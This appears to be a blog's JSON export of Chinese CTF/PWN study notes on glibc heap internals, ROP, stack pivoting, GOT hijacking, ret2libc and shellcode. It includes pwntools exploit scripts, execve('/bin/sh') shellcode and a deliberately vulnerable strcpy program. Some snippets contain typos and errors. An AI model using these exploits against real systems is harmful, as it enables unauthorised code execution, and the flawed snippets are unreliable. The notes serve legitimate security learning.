{"meta":{"title":"ZERO-A-ONE","subtitle":null,"description":"Resit much,Obey little","author":"ZERO-A-ONE","url":"http://yoursite.com","root":"/"},"pages":[{"title":"About","date":"2020-04-26T11:16:51.000Z","updated":"2020-04-27T02:27:18.000Z","comments":true,"path":"about/index.html","permalink":"http://yoursite.com/about/index.html","excerpt":"","text":"Resist much,Obey little."},{"title":"categories","date":"2020-04-26T11:17:17.000Z","updated":"2020-04-27T02:17:18.000Z","comments":true,"path":"categories/index.html","permalink":"http://yoursite.com/categories/index.html","excerpt":"","text":""}],"posts":[{"title":"Angr入门笔记（一）","slug":"Angr╚δ├┼▒╩╝╟ú¿╥╗ú⌐","date":"2020-06-29T10:03:42.000Z","updated":"2020-06-30T01:03:42.000Z","comments":true,"path":"2020/06/29/Angr╚δ├┼▒╩╝╟ú¿╥╗ú⌐/","link":"","permalink":"http://yoursite.com/2020/06/29/Angr╚δ├┼▒╩╝╟ú¿╥╗ú⌐/","excerpt":"","text":"","categories":[],"tags":[]},{"title":"长亭PWN笔记03","slug":"│ñ═ñPWN▒╩╝╟03","date":"2020-05-04T16:16:23.000Z","updated":"2020-05-05T07:16:40.000Z","comments":true,"path":"2020/05/04/│ñ═ñPWN▒╩╝╟03/","link":"","permalink":"http://yoursite.com/2020/05/04/│ñ═ñPWN▒╩╝╟03/","excerpt":"","text":"什么是堆 glibc的堆管理实现 arena bins chunk malloc和free的工作流程 fastbin attack 新版本glibc中的tcache 堆的花式玩法 什么是堆 栈通常用于为函数分配固定大小的局部内存 堆是可以根据运行时的需要进行动态分配和释放的内存，大小可变 Malloc/New Free/Delete 堆的实现重点关注内存块的组织和管理方式，尤其是空闲内存块 如何提高分配和释放效率 如何降低碎片化，提高空间利用率 举例：浏览器的DOM树通常分配在堆上 堆的实现算法影响堆分配网页加载和动态效果速度 堆的实现算法影响浏览器对内存的使用效率 常见堆实现 dlmalloc - 通用分配器 ptmalloc2 - glibc 基于dlmalloc fork出来，在2006年增加了多线程支持 jemalloc - FreeBSD、Firefox、Android tcmalloc - Google Chrome libumem - Solaris Windows 10 - segment heap ptmalloc2的多线程支持 不同的线程维护不同的堆，称为per thread arena 主线程创建的堆，称为main arena Arena数量受到CPU核数的限制 对于32位系统：arena数量上限 = 2 * 核数 对于64位系统：arena数量上限 = 8 * 核数 glibc的堆管理实现 arena 指的是堆内存区域本身，并非结构 主线程的main arena通过sbrk创建 其他线程arena通过mmap创建 malloc_state 管理arena的核心结构，包含堆的状态信息、bins链表等 main arena对应的malloc_state结构存储在glibc的全局变量中 其他线程arena对应的malloc_state存储在arena本身当中 bins bins用来管理空闲内存块，通常使用链表结构来进行组织 chunks 内存块的结构 注意： （1）以下介绍的堆管理环境为glibc 2.26 以下（不含2.26），即出现tcache之前的堆管理方式 （2）以下演示的环境均是64位程序及操作系统 Arena头部结构：malloc_statemalloc_state存储了Arena的状态，其中包括了很多用于管理空闲块的bins链表 1234567891011121314struct malloc_state &#123; mutex_t mutex; /* 同步访问相关，互斥锁 */ int flags; /* 标志位，以前是max_fast，在一些老的文章上可能还使用的这个说法，比如phrack */ mfastbinptr fastbins[NFASTBINS]; /* fastbins，之后会说到,是一个chunk的链表 */ mchunkptr top; /* top chunk，一个特殊的chunk，在之后会说到 */ mchunkptr last_remainder; /* 最后一次拆分top chunk得到的剩余内容，之后会说到 */ mchunkptr bins[BINS * 2]; /* bins，一个chunk的链表的数组，之后会说到 */ unsigned int binmap[BINMAPSIZE]; /* bins是否为空的一个位图 */ struct malloc_state *next; /* 链表，下一个malloc_state的位置 */ struct malloc_state *next_free; INTERNAL_SIZE_T system_mem; INTERNAL_SIZE_T max_system_mem;&#125;;static struct mallo_state main_arena;/*global variable in libc.so*/ 主线程的malloc_state结构存储在glibc的全局变量中，变量名为main_arena Main Arena概览 空闲内存块(free chunk)结构 在64位平台下，free chunk的第一个字段prev_size（8字节）存储了前一个chunk的大小 free chunk的第二个字段size记录了当前chunk的大小，该字段最低三个bit被用作其他含义 P代表PREV_INUSE，即代表前一个chunk是否被使用 M代表IS_MMAPPED，代表当前chunk是否属于mmap出来的 N代表NON_MAIN_ARENA，代表该chunk是否属于非MAIN Arena 第三个字段fd和第四个字段bk（8字节）前向指针和后向指针，这两个字段用于bin链表当中，用来链接大小相同或者相近的free chunk，便于后续分配时查找 已分配内存块（allocated chunk）结构 allocated chunk的前两个字段和free chunk相通 第三个字段开始到最后，chunk中存储的都是用户数据。甚至下一个chunk的第一个字段prev_size，也可以被用来存放数据，原因是这个prev_size字段只有当“前一个”chunk是free的时候才有意义，如果“前一个”chunk是已经分配的，堆管理器并不关心 所以对一个chunk来说，用户可用大小从偏移+8开始，一直到下一个chunk的orev_size字段 在64位平台下，chunk的大小一定是0x10字节的整数倍。malloc返回的指针为图中mem指向的位置，即数据开头 malloc参数与chunk大小的关系 malloc参数为用户申请的内存大小 chunk包含数据和metadata 返回的chunk只要保证其中可用数据大小等于用户申请即可 在x86 32位平台下chunk的大小一定是8字节的整数倍；x64平台下，chunk的大小一定是16字节的整数倍 Bins结构 BIns是用来管理和组织空闲内存块的链表结构，根据chunk的大小和状态，有许多种不同的Bins结构 Fast bins 用于管理小的chunk Bins small bins - 用于管理中等大小的chunk large bins - 用于管理较大的chunk unsorted bins - 用于存放未整理的chunk Fast bins123456789struct malloc_state&#123; mutex_t mutex; int flags; mfastbinptr fastbinsY[NFASTBINS]; mchunkptr top; mchunkptr last_remainder; mchunkptr bins[NBINS*2-2]; /*..*/&#125; 大小 x86_32平台：16~64字节 x64平台：32~128字节 相同大小的chunk放在一个bin中 单向链表 后进先出（FILO，First in last out） 相邻的空闲fastbin chunk不会被合并 当chunk被free时，不会清理PREV_INUSE标志 Fast bins在内存中的结构示例源代码： 1234567891011121314#include&lt;stdio.h&gt;void main()&#123; char *a1 = malloc(0x10); memset(a1,0x41,0x10); char *a2 = malloc(0x10); memset(a2,0x42,0x10); char *a3 = malloc(0x10); memset(a3,0x43,0x10); printf(\"Malloc done!\\n\"); free(a1); free(a2); printf(\"Free done\\n\"); return;&#125; 结果： 下断点在printf(&quot;Malloc done!\\n&quot;); 下断点在printf(&quot;Free done\\n&quot;); Small bins123456789struct malloc_state&#123; mutex_t mutex; int flags; mfastbinptr fastbinsY[NFASTBINS]; mchunkptr top; mchunkptr last_remainder; mchunkptr bins[NBINS*2-2]; /*..*/&#125; chunk大小 &lt; 1024 bytes(64bit) 相同大小的chunk放在一个bin中 双向循环链表 先进先出（First in first out） 当有空闲块相邻时，chunk会被合并成一个更大的chunk bins[2],bins[3],…,bins[124],bins[125]共62组smallbin，大小范围[0x20,0x3f0]（64位） Large bins123456789struct malloc_state&#123; mutex_t mutex; int flags; mfastbinptr fastbinsY[NFASTBINS]; mchunkptr top; mchunkptr last_remainder; mchunkptr bins[NBINS*2-2]; /*..*/&#125; chunk大小 &gt;= 1024 bytes(64bit) 每组bin表示一组size范围而不是具体的size，例如bins[126],bins[127]的链表中保存长度在[0x400,0x440]的chunk 双向循环链表 先进先出 chunk按照大小从大到小的排序 当有空闲块相邻，chunk会被合并 bins[126],bins[127],…,bins[250],bins[251]共63组largebin，大小范围[0x400,X]（64位） Unsorted bin123456789struct malloc_state&#123; mutex_t mutex; int flags; mfastbinptr fastbinsY[NFASTBINS]; mchunkptr top; mchunkptr last_remainder; mchunkptr bins[NBINS*2-2]; /*..*/&#125; 64位平台中：chunk大小&gt;128字节 只存在唯一一个unsorted bin 双向循环链表 当一个chunk（非fastbin）被free，它首先被放入unsorted bin，等后续整理时才会放入对应的small bin/fast bin bins[0],bins[1] Unsorted bins与small bins 其他chunk Top chunk 不属于任何bin 在arena中处于最高地址 当没有其他空闲块时，top chunk就会被用于分配 分裂时 一块是请求大小的chunk 另一块余下chunk将成为新的Top chunk Last_remainder 当请求small chunk大小的内存时，如发生分裂，则剩余的chunk保存为last_remainder malloc的工作流程 如果在size &lt; max fast，在fast bins中寻找fast chunk，如找到则结束 如果size in_smallbin_range，在small bins中寻找small chunk，如找到则结束 如果size not in_smallbin_range，合并所有fastbin的chunk 循环： 检查unsorted bin中的last_remainder 如果满足一定条件，则分裂之，将剩余的chunk标记为新的last_remainder 在unsorted bin中搜索，同时进行整理 如遇到精确大小，则返回，否则就把当前chunk整理到small/large bin中去 在small bin和large bin中搜索最合适的chunk（不一定是精确大小） 使用top chunk free的工作流程 如果size &lt; masx fast，放入fast bin，结束 如果前一个chunk是free的 unlink前面的chunk 合并两个chunk，并放入unsorted bin 如果后一个chunk是top chunk，则将当前chunk并入top chunk 如果后一个chunk是free的 unlink后面的chunk 合并两个chunk，并放入unsorted bin 前后chunk都不是free的，放入unsorted bin 相当于所有的chunk在被free时只有三种去路：放入fastbin、放入unsortbin、并入top chunk 案例分析123456789101112131415161718#include&lt;stdio.h&gt;int main()&#123; char *A,*B,*C,*D; A = malloc(0x100 - 8); B = malloc(0x100 - 8); C = malloc(0x100 - 8); D = malloc(0x100 - 8); free(A); free(C); A = malloc(0x100 - 8); free(A); A = malloc(0x80 - 8); free(B) return 0;&#125; 分配完malloc之后： 执行free之后： 再次执行A = malloc(0x100 - 8)： 再次free(A)： 再次A = malloc(0x80 - 8)： 执行free(B)后：","categories":[],"tags":[]},{"title":"长亭PWN笔记02","slug":"│ñ═ñPWN▒╩╝╟02","date":"2020-04-26T08:55:21.000Z","updated":"2020-04-27T02:56:40.000Z","comments":true,"path":"2020/04/26/│ñ═ñPWN▒╩╝╟02/","link":"","permalink":"http://yoursite.com/2020/04/26/│ñ═ñPWN▒╩╝╟02/","excerpt":"","text":"ROP实战技巧之一：连接多个libc函数调用 ROPP实战技巧之二：栈迁移(Stack Pivot) ROP案例详解 x64下的ROP ROP和GOT表劫持相关缓解技术 回顾：栈布局 回顾：Return to Libc一次在栈上布置system、exit、binsh、0，即可连续调用system(“/bin/sh”)和exit(0) 那如何串联3次或更多的libc函数调用？如果libc函数有2个以上的参数，如何不是ROP Payload？例如 12read(fd,buf,size)write(fd,buf,size) DEMO代码： 123456789101112131415161718192021222324252627from pwn import *elf = ELF(\"./ret2libc\")libc = elf.libcio = process(\"./ret2libc\")pause()io.recvuntil(\"This is your gift: \")setvbuf_addr = int(io.recvline().strip(),16)#libc.sym就是offsetlibc_base = setvbuf_addr - libc.sym[\"setvbuf\"]system_addr = libc_base + libc.sym[\"system\"]binsh_addr = libc_base + libc.search(\"/bin/sh\\x00\").next()pause()log.info(\"setvbuf_addr:0x%x\") % setvbuf_addr)log.info(\"libc_base:0x%x\") % libc_base)log.info(\"system_addr:0x%x\") % system_addr)log.info(\"binsh_addr:0x%x\") % binsh_addr)pay = \"A\"*0x68 + \"B\"*4pay += p32(system_addr)pay += 'CCCC'pay += p32(binsh_addr)io.send(pay)io.interactive() 连接多个libc函数调用例如要连接read(fd1,buf1,size1)和write(fd2,buf2,size2)两个函数调用，无法按照system(&quot;/bin/sh&quot;)和exit(0)那样布置ROP Payload，参数会产生重叠 使用pop ret这类的ROP Gadget可以解决这个问题，例如： 1pop ebx ; pop esi ; pop edi ; ret ; 这种三个的gadget下文记为pop3 ret 偏移计算 栈迁移 定义 通过一个修改esp寄存器的gadget来改变栈的位置 应用场景 溢出长度较短，不够做ROP（例1） 溢出载荷以0结尾，而gadget地址为0开头（例2） 在泄露地址后，我们需要执行一个新的ROP链 例1： 12345678vodi stack_overflow(char *user)&#123; char dst[512]; if (strlen(user)&gt;536) return; //536-512 = 24 字节的溢出，太短！ strcpy(dst,user);&#125; 例2： 1234567vodi stack_overflow(char *user)&#123; char dst[512] strcpy(dst,user);&#125;x64 assembly0x406113: 55 push %rbp0x406114: 41 89 d4 mov %edx,%e12d add esp将esp加上一个固定值的gadget我们称为“add esp”，例如：add esp，0x6c;ret; pop ebp ret + leave ret pop ebp;ret; + leavel;ret;两个gadget组合可以将esp改成任意值 pop ebp;ret;可以将ebp改为任意值 leave = mov esp,ebp;pop ebp因此ebp会存入esp，esp可以任意控制 利用 第一次ROP，泄露libc地址 调用write(1,write_got,4)，泄露write函数地址，同方法1 调用read(0,new_stack,ROP_len)，读取第二次ROP Payload到BSS段（新的栈） 利用栈迁移pop ebp ret+leave ret，连接执行第二次ROP 等待栈迁移触发第二次ROP执行，启动shell GOT表劫持思路 上述方法中，我们需要执行两次ROP，第二次ROP Payload依赖第一次ROP泄露的地址，能否只用一次ROP就完成利用？ 在ROP中通过Return To PLT调用read和write，实际上可以实现内存任意读写 因此，为了最终执行system()我们可以不使用ROP，而是使用GOT表劫持的方法：先通过ROP调用read，来修改wrtie函数的GOT表项，然后再次调用write，实际上此时调用的则是GOT表项被劫持后的值，例如system() 详细步骤 使用一次ROP，完成libc地址泄露、GOT表劫持、命令字符串写入 调用write(1,write_got,4)，泄露write函数地址 调用read()，修改write()函数的GOT表项为system地址 调用read(0,bss,len(cmd))，将命令字符串(“/bin/sh”)写入.bss Section 调用write(cmd)，实际上调用的system(cmd) 读取泄露的write函数地址，计算system()地址 输入system()地址，修改write()函数的GOT表项 输入命令字符串”/bin/sh”，写入.bss Section 调用write(cmd)来运行system(cmd) 如果题目没有给予libc怎么办 从寻找我们需要的libc_base 使用DynELF DynELF 原理：如果可以实现任意内存读，可以模拟_dll_runtime_resolve函数的行为来解析符号，这样的好处是无需知道libc。pwntools库中的DynELF模块已经实现了此功能 编写一个通用的任意内存泄露函数 通过返回main()函数来允许内存泄露触发多次 将泄露函数传入DynELF来解析system()函数的地址 通过ROP来调用system(“/bin/sh”) 当目标的libc库未知时，DynELF非常有用 DEMO展示： 1234567891011121314151617181920212223242526272829303132333435363738from pwn import *context(arch='i386',os='linux',endian='little',log_level='debug')main = 0x80481Dbss = 0x8049700elf = ELF(\"\")p = process(\"\")print \"[+] PID: %s\" % proc.pidof(p)log.info(\"[+] system: %s\" % hex(system))#将栈溢出封装成ROP调用，方便多次触发def do_rop(rop): payload = 'A' * (0x88 + 4) payload += rop p.send(payload)#任意内存读函数，通过ROP调用write函数将任意地址内存读出，最后回到main，实现反复触发def peek(addr): payload = 'A' * (0x88 + 4) rop = p32(elf.plt['write']) + p32(main) + p32(1) + p32(add) + p32(4) payload += rop p.send(payload) data = p.recv(4) return data#任意内存写函数，通过ROP调用write函数将任意地址内存写入，最后回到main，实现反复触发def poke(addr,data): payload = 'A' * (0x88 + 4) rop = p32(elf.plt['read']) + p32(main) + p32(0) + p32(add) + p32(len(data)) payload += rop p.send(payload) p.send(data)#将任意内存泄露函数peek传入DynELFd = DynELF(peek,elf=elf)#DynELF模块可以实现任意库中的任意符号解析，例如systemsystem = d.lookup(\"system\",\"libc.so\")log.info(\"[+] system: %s\" % hex(system))#将要执行的命令写入.bss Sectionpoke(bss,'/bin/sh\\0')#通过ROP运行system(cmd)do_rop(p32(system) + p32(0xDEADBEEF) + p32(bss))p.interactive() x64架构下的ROP amd64（64位）cdecl调用约定 使用寄存器rdi、rsi、rdx、rcx、r8、r9来传递前6个参数 第七个及以上的参数通过栈来传递 参数在寄存器中，必须用gadget来设置参数 pop rdi ; ret pop rsi ; pop r15 ; ret ; 用gadget设置rdx和rcx寄存器就比较困难一点，没有例如pop ret这种特别直接的gadget x64下通用Gadget12345678910111213141516171819.text:0000000000400600 loc_400600: ; CODE XREF: __libc_csu_init+54\u0019j.text:0000000000400600 mov rdx, r13.text:0000000000400603 mov rsi, r14.text:0000000000400606 mov edi, r15d.text:0000000000400609 call qword ptr [r12+rbx*8].text:000000000040060D add rbx, 1.text:0000000000400611 cmp rbx, rbp.text:0000000000400614 jnz short loc_400600.text:0000000000400616.text:0000000000400616 loc_400616: ; CODE XREF: __libc_csu_init+34\u0018j.text:0000000000400616 add rsp, 8.text:000000000040061A pop rbx.text:000000000040061B pop rbp.text:000000000040061C pop r12.text:000000000040061E pop r13.text:0000000000400620 pop r14.text:0000000000400622 pop r15.text:0000000000400624 retn.text:0000000000400624 __libc_csu_init endp 几乎所有的x64 ELF在_libc_csu_init函数中存在上面两个Gadget，第二个Gadget可以设置r13、r14、r15，再通过一个Gadget将这三个值分别送入rdx、rsi、edi中，正好涵盖了x64 cdecl调用约定下的前三个参数 One Gadget通过OneGadget工具进行查找：https://github.com/david942j/one_gadget 通常执行system(“/bin/sh”)需要在调用system之前传递参数； 比较神奇的是，libc中包含一些gadget，直接跳转过去即可启动shell； 通常通过寻找字符串”/bin/sh”的引用来寻找（对着/bin/sh的地址在IDA Pro中按X） 如何防御ROP 位置无关代码（PIE）可防御攻击者直接ROP 攻击者不知道代码地址 ROP与return to PLT技术无法直接使用 PIE绕过方法 结合信息泄露漏洞 x86_32架构下可爆破 内存地址随机化粒度以页为单位：0x1000字节对齐 如何防御GOT表劫持 重定位只读(Relocation Read Only)缓解措施 编译选项：gcc -z , relro 在进入main()之前，所有的外部函数都会被解析 所有GOT表设置为只读 绕过方法 劫持为开启该保护的动态库中的GOT表(例如libc中的GOT表) 改写函数返回地址或函数指针","categories":[{"name":"长亭PWN笔记","slug":"长亭PWN笔记","permalink":"http://yoursite.com/categories/长亭PWN笔记/"}],"tags":[]},{"title":"长亭PWN笔记01","slug":"│ñ═ñPWN▒╩╝╟01","date":"2020-04-26T08:54:26.000Z","updated":"2020-04-27T02:56:48.000Z","comments":true,"path":"2020/04/26/│ñ═ñPWN▒╩╝╟01/","link":"","permalink":"http://yoursite.com/2020/04/26/│ñ═ñPWN▒╩╝╟01/","excerpt":"","text":"PWN工具集合 zio - 框架 接口简单易用 https://github.com/zTrix/zio Pwntools Pwn框架，集成了很多工具，例如shellcode生成，ROP链生成等 http://pwntools.com/ https://github.com/gallopsled/pwntools peda/pwndbg - gdb调试插件 libheap 利用栈溢出Example BOE program：123456789#include&lt;stdio.h&gt;#include&lt;string.h&gt;int main(int argc,char **argv)&#123; char buf[128]; if (argc&lt;2) return 1; strcpy(buf,argv[1]); printf(\"argv[1]:%s\\n\",buf); return 0;&#125; 作为第一个漏洞利用的案例，我们不开启栈不可执行和栈canary的保护选项 argc即命令行参数个数 argv[0]即程序名字符串本身，argv[1]是第一个参数，以此类推 编译命令如下： 1gcc -z execstack -fno-stack-protector bof.c -o bof -m32 分析：程序接收命令行输入第一个参数，如果这个参数过长，strcpy时会溢出栈上缓冲区buf 高地址 char **argv int argc return address saved %ebp 低地址 char buf[128] 栈在内存中是从高地址到低地址增长 局部变量char是从低地址到高地址增长 当字符串参数过长就会出现： 高地址 char **argv int argc buf[132~135] buf[128~131] 低地址 buf[0~127] 可以把Shellcode放在返回地址之后，然后通过覆盖返回地址跳转至Shellcode 高地址 Shellcode Shellcode Shellcode addr buf[128~131] 低地址 buf[0~127] 1payload : padding1 + address of shellcode + shellcode 有一种手法可以把return address覆盖为jmp esp的地址，这样就不用管具体Shellcode addr的具体地址了，只要shellcode跟在jmp esp指令后面即可 高地址 Shellcode Shellcode Shellcode addr jmp esp buf[128~131] 低地址 buf[0~127] 1payload : padding1 + address of jmp esp + shellcode shellcode手写首先查看一下execve函数的原型： 1int execve(const char *filename,char *const argv[],cahr *const envp[]) 手写64位下的shellcode代码 1234567891011xor %eax,%eaxpushl %eaxpush $0x68732f2fpush $0x6e69622fmovl %esp,%ebxpushl %eaxpushl %ebxmovl %esp,%ecxcltdmovb $0xb,%alint $0x80 此处eax为0，因此cltd相当于将edx也设为0 以上代码实现的效果就是 1execve(\"/bin/sh\",null,null) Syscall 调用约定 syscall number: %eax=0xb 第一个参数：%ebx=filename 第二个参数：%ecx=argv 第三个参数：%edx=envp=0 第四个参数：%esi 第五个参数：%edi 第六个参数：%ebp 测试用内联（inline）汇编测试编写的shellcode，也可以使用汇编器as直接编译汇编代码 123456789101112131415161718192021void shellcode()&#123; _asm_( \"xor %eax,%eax\\n\\t\" \"pushl %eax\\n\\t\" \"push $0x68732f2f\\n\\t\" \"push $0x6e69622f\\n\\t\" \"movl %esp,%ebx\\n\\t\" \"pushl %eax\\n\\t\" \"pushl %ebx\\n\\t\" \"movl %esp,%ecx\\n\\t\" \"cltd\\n\\t\" \"movb $0xb,%al\\n\\t\" \"int $0x80\\n\\t\" )&#125;int main(int argc,char **argv)&#123; shellcode(); return 0;&#125; 提取提取测试代码反汇编出来的机器码 1objdump -d shellcode 提取得到shellcode的指令的机器码 123SHELLCODE = &quot;\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x50\\x53\\x89\\xe1\\x99\\xb0\\x0b \\xcd\\x80&quot; 所以上述代码还可以改写为： 12345678char shellcode[]=\"\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x50\\x53\\x89\\xe1\\x99\\xb0\\x0b \\xcd\\x80\";int main(int argc,char **argv)&#123; void(*f)()=(void(*)())shellcode; f(); return 0;&#125; 段代码中，shellcode存储在全局字符数组中，属于.data section,编译器默认其不可执行，必须加上选项-z execstack,即开启栈/堆/数据段可执行 栈溢出漏洞利用步骤 找到能够刚好覆盖返回地址的缓冲区长度 填充Shellcode并找到Shellcode所在地址 将返回地址覆盖为Shellcode地址 寻找填充长度手动寻找为了精确覆盖返回地址，首先要找到从缓冲区开头到栈上的返回地址有多少距离。我们可以先找到缓冲区开头的地址，再找到返回地址所在位置，两者相减即可。为了找到缓冲区开头地址，我们可以在调用strcpy之前下断点，通过查看strcpy第一个参数即可。另外，可在main函数返回前断下，此时esp指向的即是返回地址所在位置。 现在依然以上文的示例程序为例： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849syc@ubuntu:~/Desktop/test$ gdb -q --args bof AAAApwndbg: loaded 179 commands. Type pwndbg [filter] for a list.pwndbg: created $rebase, $ida gdb functions (can be used with print/break)Reading symbols from bof...(no debugging symbols found)...done.pwndbg&gt; rStarting program: /home/syc/Desktop/test/bof AAAAargv[1]:AAAA[Inferior 1 (process 3282) exited normally]pwndbg&gt; disassemble mainDump of assembler code for function main: 0x5655554d &lt;+0&gt;: lea ecx,[esp+0x4] 0x56555551 &lt;+4&gt;: and esp,0xfffffff0 0x56555554 &lt;+7&gt;: push DWORD PTR [ecx-0x4] 0x56555557 &lt;+10&gt;: push ebp 0x56555558 &lt;+11&gt;: mov ebp,esp 0x5655555a &lt;+13&gt;: push ebx 0x5655555b &lt;+14&gt;: push ecx 0x5655555c &lt;+15&gt;: add esp,0xffffff80 0x5655555f &lt;+18&gt;: call 0x56555450 &lt;__x86.get_pc_thunk.bx&gt; 0x56555564 &lt;+23&gt;: add ebx,0x1a70 0x5655556a &lt;+29&gt;: mov eax,ecx 0x5655556c &lt;+31&gt;: cmp DWORD PTR [eax],0x1 0x5655556f &lt;+34&gt;: jg 0x56555578 &lt;main+43&gt; 0x56555571 &lt;+36&gt;: mov eax,0x1 0x56555576 &lt;+41&gt;: jmp 0x565555b1 &lt;main+100&gt; 0x56555578 &lt;+43&gt;: mov eax,DWORD PTR [eax+0x4] 0x5655557b &lt;+46&gt;: add eax,0x4 0x5655557e &lt;+49&gt;: mov eax,DWORD PTR [eax] 0x56555580 &lt;+51&gt;: sub esp,0x8 0x56555583 &lt;+54&gt;: push eax 0x56555584 &lt;+55&gt;: lea eax,[ebp-0x88] 0x5655558a &lt;+61&gt;: push eax 0x5655558b &lt;+62&gt;: call 0x565553e0 &lt;strcpy@plt&gt; 0x56555590 &lt;+67&gt;: add esp,0x10 0x56555593 &lt;+70&gt;: sub esp,0x8 0x56555596 &lt;+73&gt;: lea eax,[ebp-0x88] 0x5655559c &lt;+79&gt;: push eax 0x5655559d &lt;+80&gt;: lea eax,[ebx-0x1994] 0x565555a3 &lt;+86&gt;: push eax 0x565555a4 &lt;+87&gt;: call 0x565553d0 &lt;printf@plt&gt; 0x565555a9 &lt;+92&gt;: add esp,0x10 0x565555ac &lt;+95&gt;: mov eax,0x0 0x565555b1 &lt;+100&gt;: lea esp,[ebp-0x8] 0x565555b4 &lt;+103&gt;: pop ecx 0x565555b5 &lt;+104&gt;: pop ebx 0x565555b6 &lt;+105&gt;: pop ebp 0x565555b7 &lt;+106&gt;: lea esp,[ecx-0x4] 0x565555ba &lt;+109&gt;: ret End of assembler dump. 在调用strcpy和ret指令处下断点 1234pwndbg&gt; b *0x5655558bBreakpoint 1 at 0x5655558bpwndbg&gt; b *0x565555baBreakpoint 2 at 0x565555ba 开始调试 1234567891011121314151617181920pwndbg&gt; r AAAAStarting program: /home/syc/Desktop/test/bof AAAABreakpoint 1, 0x5655558b in main () ► 0x5655558b &lt;main+62&gt; call strcpy@plt &lt;0x565553e0&gt; dest: 0xffffced0 ◂— 0x0 src: 0xffffd1fd ◂— 'AAAA'pwndbg&gt; x/wx $esp0xffffcec0: 0xffffced0 0xffffd1fd //分别是strcpy的两个参数，第一个参数即为目标缓冲区0xffffced0pwndbg&gt; cContinuing.argv[1]:AAAABreakpoint 2, 0x565555ba in main ()pwndbg&gt; x/wx $esp0xffffcf6c: 0xf7df4e81pwndbg&gt; p/d 0xffffcf6c - 0xffffced0$1 = 156 在第一个断点处，找到缓冲区起始地址为0xffffced0 2在第二个断点处，找到缓冲区起始地址为0xffffcf6c 二者相减可以知道溢出超过140字节时会覆盖返回地址 pwntools之cyclicCyclic pattern是一个很强大的功能，大概意思就是，使用pwntools生成一个pattern，pattern就是指一个字符串，可以通过其中的一部分数据去定位到他在一个字符串中的位置 在我们完成栈溢出题目的时候，使用pattern可以大大的减少计算溢出点的时间。用法： 123cyclic(0x100) # 生成一个0x100大小的pattern，即一个特殊的字符串cyclic_find(0x61616161) # 找到该数据在pattern中的位置cyclic_find(&apos;aaaa&apos;) # 查找位置也可以使用字符串去定位 比如，我们在栈溢出的时候，首先构造cyclic(0x100)，或者更长长度的pattern，进行输入，输入后pc的值变味了0x61616161，那么我们通过cyclic_find(0x61616161)就可以得到从哪一个字节开始会控制PC寄存器了，避免了很多没必要的计算 Return to Libc发生栈溢出时，不跳转到shellcode，而实跳转到libc中的函数 简单的一个函数以调用system函数为例的栈布局 0 “/bin/sh” exit return addr system padding system返回时，栈上对应的返回地址为exit()函数，进而执行exit(0)，所以相当于执行了： 12system(\"/bin/sh\")exit(0) 简单来说就是： 获得system()和exit()的函数地址 获得”/bin/sh”字符串地址 构造溢出载荷 system + exit + “bin/sh” + 0 实验在关闭ASLR情况下进行，libc函数地址固定不变 获得system()和exit()的函数地址 可以在GDB中直接使用print命令查看 1234pwndbg&gt; print system$1 = &#123;int (const char *)&#125; 0xf7e19200 &lt;__libc_system&gt;pwndbg&gt; p exit$2 = &#123;void (int)&#125; 0xf7e0c3d0 &lt;__GI_exit&gt; 获得”/bin/sh”字符串地址glibc中必定有字符串”/bin/sh”，可以使用GDB中的find命令，在libc的内存范围内搜索 12345678910111213141516171819202122pwndbg&gt; vmmapLEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA0x56555000 0x56556000 r-xp 1000 0 /home/syc/Desktop/test/bof0x56556000 0x56557000 r-xp 1000 0 /home/syc/Desktop/test/bof0x56557000 0x56558000 rwxp 1000 1000 /home/syc/Desktop/test/bof0xf7ddc000 0xf7fb1000 r-xp 1d5000 0 /lib/i386-linux-gnu/libc-2.27.so0xf7fb1000 0xf7fb2000 ---p 1000 1d5000 /lib/i386-linux-gnu/libc-2.27.so0xf7fb2000 0xf7fb4000 r-xp 2000 1d5000 /lib/i386-linux-gnu/libc-2.27.so0xf7fb4000 0xf7fb5000 rwxp 1000 1d7000 /lib/i386-linux-gnu/libc-2.27.so0xf7fb5000 0xf7fb8000 rwxp 3000 0 0xf7fd0000 0xf7fd2000 rwxp 2000 0 0xf7fd2000 0xf7fd5000 r--p 3000 0 [vvar]0xf7fd5000 0xf7fd6000 r-xp 1000 0 [vdso]0xf7fd6000 0xf7ffc000 r-xp 26000 0 /lib/i386-linux-gnu/ld-2.27.so0xf7ffc000 0xf7ffd000 r-xp 1000 25000 /lib/i386-linux-gnu/ld-2.27.so0xf7ffd000 0xf7ffe000 rwxp 1000 26000 /lib/i386-linux-gnu/ld-2.27.so0xfffdd000 0xffffe000 rwxp 21000 0 [stack]pwndbg&gt; find /b 0xf7ddc000, 0xf7fb5000,'/','b','i','n','/','s','h',00xf7f5a0cf1 pattern found.pwndbg&gt; x/s 0xf7f5a0cf0xf7f5a0cf: \"/bin/sh\" 0xf7ddc000是libc起始地址，0xf7fb5000是结尾地址 获取地址的另一种方法12345678910111213141516171819202122syc@ubuntu:~/Desktop/test$ ldd bof linux-gate.so.1 (0xf7eff000) libc.so.6 =&gt; /lib/i386-linux-gnu/libc.so.6 (0xf7d03000) /lib/ld-linux.so.2 (0xf7f00000)syc@ubuntu:~/Desktop/test$ readelf -s /lib/i386-linux-gnu/libc.so.6 | grep system ... 1510: 0003d200 55 FUNC WEAK DEFAULT 13 system@@GLIBC_2.0syc@ubuntu:~/Desktop/test$ readelf -s /lib/i386-linux-gnu/libc.so.6 | grep exit ... 147: 000303d0 33 FUNC GLOBAL DEFAULT 13 exit@@GLIBC_2.0 ...syc@ubuntu:~/Desktop/test$ strings -tx /lib/i386-linux-gnu/libc.so.6 | grep /bin/sh 17e0cf /bin/sh syc@ubuntu:~/Desktop/test$ gdb -qpwndbg: loaded 179 commands. Type pwndbg [filter] for a list.pwndbg: created $rebase, $ida gdb functions (can be used with print/break)pwndbg&gt; p/x 0xf7d03000 + 0x0003d200$1 = 0xf7d40200pwndbg&gt; p/x 0xf7d03000 + 0x000303d0$2 = 0xf7d333d0pwndbg&gt; p/x 0xf7d03000 + 0x017e0cf$3 = 0xf7e810cf 首先用ldd命令获取libc基址 然后用readelf命令找到system和exit函数在libc中的偏移 用strings命令找到字符串/bin/sh在libc中的偏移 最后通过与libc基址相加来获得最终地址 有时候我们会发现”/bin/sh”的地址中包含换行符0a，argv[1]会被换行符截断，解决方案：使用”sh\\0” 